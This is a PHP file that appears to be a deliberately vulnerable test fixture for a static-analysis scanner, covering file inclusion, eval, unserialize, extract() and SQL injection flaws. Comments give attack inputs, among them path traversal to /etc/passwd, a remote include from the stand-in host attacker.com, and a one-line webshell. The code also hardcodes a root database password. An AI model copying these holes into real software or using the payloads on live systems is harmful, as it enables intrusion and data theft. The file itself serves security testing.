<?php
/**
 * sast_advanced/path_traversal.php — TigerGate CNAPP: SAST – PHP Injections
 *
 * PURPOSE: PHP-specific vulnerabilities including path traversal, Remote File
 * Inclusion (RFI), Local File Inclusion (LFI), and code injection.
 *
 * SAST FINDINGS:
 *   PHP-001: Local File Inclusion via user-supplied include path (CWE-98)
 *   PHP-002: Remote File Inclusion — allow_url_include enabled (CWE-98)
 *   PHP-003: eval() with user input — Remote Code Execution (CWE-94)
 *   PHP-004: unserialize() with user data — Object Injection (CWE-502)
 *   PHP-005: preg_replace with /e modifier — DEPRECATED RCE vector
 *   PHP-006: extract() on $_GET/$_POST — variable injection (CWE-621)
 */

// ── PHP-001: Local File Inclusion ─────────────────────────────────────────────
// 🔴 PHP-001: User controls which file gets included
// Attack: ?page=../../../../etc/passwd
// Attack: ?page=../../../../var/log/apache2/access.log  (log poisoning → RCE)
$page = $_GET['page'] ?? 'home';
// 🔴 PHP-001: No validation on $page before inclusion
include($page . '.php');   // Attacker controls this path!
// Fix: use an allowlist: if (!in_array($page, ['home', 'about', 'contact'])) die();

// ── PHP-002: Remote File Inclusion ───────────────────────────────────────────
// Requires allow_url_include=On in php.ini (bad practice, often enabled)
// Attack: ?module=http://attacker.com/evil.php
$module = $_GET['module'] ?? 'local_module';
// 🔴 PHP-002: Including remote URL — attacker hosts malicious PHP
include_once($module);     // If attacker.com/evil.php contains <?php system($_GET['cmd']); ?>

// ── PHP-003: eval() with User Input ──────────────────────────────────────────
// 🔴 PHP-003: Direct RCE — eval executes arbitrary PHP code
// Attack: ?formula=phpinfo(); or ?formula=system("cat /etc/passwd");
$formula = $_POST['formula'] ?? '';
$result = eval("return $formula;");  // 🔴 PHP-003: CRITICAL — instant RCE!
echo "Result: $result";
// Fix: Use a proper math expression parser library instead of eval()

// ── PHP-004: Insecure unserialize() ──────────────────────────────────────────
// 🔴 PHP-004: Object injection via unserialize with user data (CWE-502)
// Attack: craft malicious serialized PHP object that calls system() via __destruct()
$session_data = $_COOKIE['session'] ?? '';
// 🔴 PHP-004: Unserializing untrusted cookie data
$user = unserialize($session_data);  // Triggers __wakeup/__destruct on attacker's object!
// Fix: Use json_decode() for data, never unserialize() from untrusted sources

// ── PHP-005: preg_replace with /e modifier (Deprecated RCE) ─────────────────
// 🔴 PHP-005: The /e modifier evaluates the replacement as PHP code
// This was removed in PHP 7 but still exists in legacy codebases
// Attack: Pass user input as subject when pattern matches — code gets eval'd
$subject = $_GET['input'] ?? '';
$result  = preg_replace('/(.*)/e', 'strtolower("\\1")', $subject);
// A proper attack would make the pattern match something that calls system()

// ── PHP-006: extract() Variable Injection ────────────────────────────────────
// 🔴 PHP-006: extract() turns query string params into PHP variables
// Attack: ?admin=1&role=superadmin
// Result: $admin = 1 and $role = 'superadmin' get injected into scope!
extract($_GET);    // 🔴 ALL query parameters become variables — overwrites existing ones!
extract($_POST);   // 🔴 Same for POST data

// If code later does: if ($admin) { ... } → attacker bypasses auth check!
// Fix: NEVER use extract() on superglobals. Access $_GET['key'] explicitly.

// ── Bonus: SQL Injection in PHP ───────────────────────────────────────────────
$conn = new mysqli("localhost", "root", "password", "megacorp_db");
$username = $_POST['username'] ?? '';
// 🔴 SQL Injection: string concatenation in query (CWE-89)
$query = "SELECT * FROM users WHERE username = '$username'";  // 🔴 Classic SQLi!
$result = $conn->query($query);
// Fix: $stmt = $conn->prepare("SELECT * FROM users WHERE username = ?"); $stmt->bind_param("s", $username);
